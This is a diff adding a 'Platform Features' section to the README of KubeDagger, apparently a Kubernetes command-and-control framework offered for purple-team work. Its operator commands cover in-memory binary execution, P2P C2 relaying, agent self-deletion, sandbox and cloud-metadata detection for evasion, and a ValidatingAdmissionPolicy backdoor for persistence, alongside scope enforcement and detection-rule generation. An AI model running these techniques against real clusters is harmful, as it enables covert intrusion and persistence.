@@ -72,6 +72,22 @@
 - [Encrypted C2 Channel](#encrypted-c2-channel)
 - [Persistence](#persistence)
 - [Multi-Node Coordination](#multi-node-coordination)
+- [Platform Features](#platform-features)
+  - [Structured Event Telemetry](#structured-event-telemetry)
+  - [Scope Enforcement](#scope-enforcement)
+  - [Malleable C2 Profiles](#malleable-c2-profiles)
+  - [Campaign Web UI](#campaign-web-ui)
+  - [Dead-Man Switch](#dead-man-switch)
+  - [Dry-Run Mode](#dry-run-mode)
+  - [Sandbox Detection](#sandbox-detection)
+  - [P2P Mesh Relay](#p2p-mesh-relay)
+  - [Hot-Loading](#hot-loading)
+  - [Cloud Metadata Awareness](#cloud-metadata-awareness)
+  - [Detection Rule Generation](#detection-rule-generation)
+  - [Engagement Reports](#engagement-reports)
+  - [VAP Backdoor Persistence](#vap-backdoor-persistence)
+  - [Test Lab](#test-lab)
+  - [Purple-Team Workflow](#purple-team-workflow)
 - [Integration Testing](#integration-testing)
 
 ---
@@ -2166,6 +2182,279 @@ kubedagger-client network_discovery get --passive --all-nodes
 
 # The dashboard shows data from all connected peers
 kubedagger-client dashboard
+```
+
+---
+
+## Platform Features
+
+The platform features tie the C2 framework into a complete purple-team workflow: scoped engagements with structured telemetry, web-based campaign monitoring, engagement reporting, and detection-rule generation for defenders.
+
+### Structured Event Telemetry
+
+Start the server with `-events <path>` to record a JSONL event log of every agent check-in, task submission, and task result:
+
+```shell
+./bin/kubedagger-server -key $KEY -events events.jsonl
+```
+
+Each line is a self-contained JSON object. The event log powers the campaign web UI views and the `report generate` client command — engagement reports are rendered directly from it.
+
+### Scope Enforcement
+
+`-scope <scope.yaml>` installs a task allow-list policy on the server. Any task whose payload targets a namespace, domain, IP, or URL outside the scope is rejected with an error listing every violation — out-of-scope tasking never reaches an agent.
+
+```shell
+./bin/kubedagger-server -key $KEY -scope scope.yaml
+```
+
+Example scope file:
+
+```yaml
+namespaces: [default, staging]
+domains: [".corp.example.com"]
+cidrs: ["10.0.0.0/8"]
+```
+
+**Rules:**
+
+| Key | Description |
+|-----|-------------|
+| `namespaces` | Allowed Kubernetes namespaces |
+| `domains` | Allowed hostnames; a leading dot (`.corp.example.com`) also allows all subdomains |
+| `cidrs` | Allowed IP ranges (CIDR notation) |
+| `*` | Allows everything in a category (e.g. `domains: ["*"]`) |
+
+Payload keys checked: `namespace`/`ns`, `host`/`target`/`domain`, `ip`/`addr`, and `url`.
+
+### Malleable C2 Profiles
+
+`-malleable <profile.yaml>` drives agent beacon timing. The server derives a sleep interval from the profile and returns it in every check-in response, so beacon cadence can be re-tuned from the server without redeploying agents.
+
+```shell
+./bin/kubedagger-server -key $KEY -malleable profile.yaml
+```
+
+Example profile:
+
+```yaml
+name: quiet-hours
+sleep_base_seconds: 300
+jitter_pct: 25
+user_agents:
+  - "Mozilla/5.0 (X11; Linux x86_64)"
+headers:
+  X-Custom-Header: value
+```
+
+**Fields:**
+
+| Field | Constraint | Description |
+|-------|------------|-------------|
+| `name` | | Profile name |
+| `sleep_base_seconds` | >= 1 | Base beacon sleep interval in seconds |
+| `jitter_pct` | 0-100 | Random jitter applied to the sleep interval |
+| `user_agents` | | User-Agent values for the profile |
+| `headers` | | Extra HTTP headers for the profile |
+
+### Campaign Web UI
+
+`-webui <addr>` starts the campaign web UI alongside the C2 listener; `-webui-token <token>` sets the access token:
+
+```shell
+./bin/kubedagger-server -key $KEY -events events.jsonl -webui 127.0.0.1:8080 -webui-token <token>
+```
+
+**Views:**
+
+| Path | Description |
+|------|-------------|
+| `/campaign` | Campaign timeline built from the event log, filterable by agent and event type |
+| `/replay?offset=N&step=M` | Session replay — step through events `M` at a time with newer/older navigation |
+
+The campaign and replay views require the server to be running with `-events`.
+
+### Dead-Man Switch
+
+Agents support a `-deadman <duration>` flag (default `0` = disabled). If no successful C2 check-in completes within the window, the agent logs the failure, best-effort removes its own binary from disk, and exits with "dead-man switch triggered".
+
+```shell
+# Self-destruct if the C2 server is unreachable for 24 hours
+./bin/kubedagger-agent-linux -server https://c2.example.com:443 -deadman 24h
+```
+
+### Dry-Run Mode
+
+Any module or shell task accepts the payload argument `dryrun=true`. Instead of executing, the agent returns a "DRY-RUN: would execute ..." summary describing what would have run — useful for validating tasking (and scope policy) before a live engagement.
+
+```shell
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=cnative-sensor dryrun=true
+```
+
+### Sandbox Detection
+
+The `sandbox_detect` module fingerprints the execution environment: gVisor, Kata, Firecracker, WSL, container markers (`.dockerenv`, `/proc/1/cgroup`), and VM vendors. The output includes per-environment implications — for example, syscall-based container escapes fail under gVisor.
+
+```shell
+./bin/kubedagger-operator -key $KEY module <agent-id> sandbox_detect
+```
+
+No arguments.
+
+### P2P Mesh Relay
+
+The `mesh` module turns an agent into a P2P C2 relay: child agents point their `-server` URL at the parent relay instead of each reaching the C2 server directly, reducing egress exposure.
+
+```shell
+# Start a relay on an agent (children point their -server URL at the relay host)
+./bin/kubedagger-operator -key $KEY module <agent-id> mesh action=listen port=8888 server=https://c2:443
+
+# List active relays
+./bin/kubedagger-operator -key $KEY module <agent-id> mesh action=peers
+
+# Stop a relay
+./bin/kubedagger-operator -key $KEY module <agent-id> mesh action=stop port=8888
+```
+
+**Arguments:**
+
+| Argument | Description |
+|----------|-------------|
+| `action` | `listen`, `peers`, or `stop` |
+| `port` | Relay listen port |
+| `server` | Upstream C2 server URL the relay forwards to (required for `listen`) |
+
+### Hot-Loading
+
+The `hotload` module executes a supplied binary entirely in memory via memfd (Linux only) — no disk artifact:
+
+```shell
+./bin/kubedagger-operator -key $KEY module <agent-id> hotload exec_b64=<base64 ELF> args_str="arg1 arg2" timeout=60s
+```
+
+**Arguments:**
+
+| Argument | Description |
+|----------|-------------|
+| `exec_b64` | Base64-encoded ELF binary to execute |
+| `args_str` | Space-separated arguments passed to the binary |
+| `timeout` | Execution timeout (e.g. `60s`) |
+
+Output is captured (64KB cap) and the exit code is reported in the task result.
+
+### Cloud Metadata Awareness
+
+`cloud_evasion action=clouddetect` probes AWS, Azure, and GCP instance metadata endpoints (the IMDSv2 token flow, the Azure Metadata header, and the GCP flavor header) and reports which cloud the agent is running in, with guidance about the cloud-native detection telemetry likely present in that environment.
+
+```shell
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=clouddetect
+```
+
+### Detection Rule Generation
+
+The `detection` client command produces the defensive half of the purple-team loop: the detection rules that would catch each KubeDagger technique.
+
+```shell
+# List the detection-rule catalog (18 techniques with MITRE ATT&CK IDs)
+kubedagger-client detection list
+
+# Generate a markdown coverage report for all techniques
+kubedagger-client detection generate --out detections.md
+
+# Only specific techniques
+kubedagger-client detection generate --techniques sa_token,k8s_discovery --out detections.md
+```
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--techniques` | `all` | Comma-separated technique keys from the catalog |
+| `--out` | stdout | Output file path |
+
+Each catalog entry (e.g. `sa_token`, `escape`, `daemonset`, `memexec`) maps the technique to its MITRE ATT&CK ID, a runtime-sensor rule (cnative-sensor rule format), a Sigma-format SIEM rule, and the Kubernetes audit event patterns that would detect it — ready to hand to defenders.
+
+### Engagement Reports
+
+The `report generate` client command renders an engagement report from the server's event log: engagement statistics, a per-technique summary with MITRE ATT&CK mapping, and a chronological timeline of all activity.
+
+```shell
+# Markdown report
+kubedagger-client report generate --events events.jsonl --out report.md
+
+# Self-contained HTML report with engagement metadata
+kubedagger-client report generate --events events.jsonl --out report.html --html \
+  --title "Q3 Purple Team" --operator "red-team" --client "Example Corp" \
+  --start 2026-10-01 --end 2026-10-07 --scope "default, staging"
+```
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--events` | (required) | Path to the server's JSONL event log |
+| `--out` | stdout | Output file path |
+| `--html` | `false` | Emit a self-contained HTML report instead of markdown |
+| `--title` | | Report title |
+| `--operator` | | Operator name |
+| `--client` | | Client name |
+| `--start` | | Engagement start date |
+| `--end` | | Engagement end date |
+| `--scope` | | Engagement scope description |
+
+### VAP Backdoor Persistence
+
+`vap_backdoor` establishes persistence via a Kubernetes ValidatingAdmissionPolicy (requires Kubernetes >= 1.30). It creates a cluster-level policy — plus its binding — that denies deletion of any resource carrying the backdoor label.
+
+```shell
+# Deploy with defaults (namespace: default, label: kubedagger-backdoor=true)
+kubedagger-client vap_backdoor
+
+# Custom label and namespace
+kubedagger-client vap_backdoor --namespace kube-system --label kubedagger-backdoor=true
+
+# Explicit kubeconfig
+kubedagger-client vap_backdoor --kubeconfig ~/.kube/config
+```
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--namespace` | `default` | Namespace for the policy resources |
+| `--label` | `kubedagger-backdoor=true` | Label that marks protected (backdoored) resources |
+| `--kubeconfig` | (auto-detect) | Path to kubeconfig |
+
+### Test Lab
+
+A kind-based lab cluster lets you exercise detection workflows against 8 lightweight stand-in deployments whose namespaces and labels match the real cloud-native security product detection signatures (cnative-sensor, cnative-policy, cnative-net, cnative-probe, cnative-registry, cnative-backup, cnative-audit, cnative-scanner). `make lab-test` fails unless all 8 detections fire.
+
+```shell
+make lab-up     # create the "kubedagger-lab" kind cluster + apply stand-ins
+make lab-test   # verify all 8 detections report the stand-ins
+make lab-down   # delete the cluster
+```
+
+See [docs/LAB.md](docs/LAB.md) for prerequisites, stand-in details, and how detection is invoked.
+
+### Purple-Team Workflow
+
+A full loop from engagement to defender deliverables:
+
+```shell
+# 1. Start the server with telemetry, scope enforcement, and the campaign web UI
+./bin/kubedagger-server -key $KEY -events events.jsonl -scope scope.yaml \
+  -webui 127.0.0.1:8080 -webui-token <tok>
+
+# 2. Run the engagement via the operator; monitor the campaign timeline at
+#    /campaign and review activity step-by-step in /replay
+
+# 3. After the engagement, render the report
+kubedagger-client report generate --events events.jsonl --out report.md --html
+
+# 4. Generate the detection coverage report and hand defenders the rules
+#    that would catch each technique
+kubedagger-client detection generate --out detections.md
 ```
 
 ---
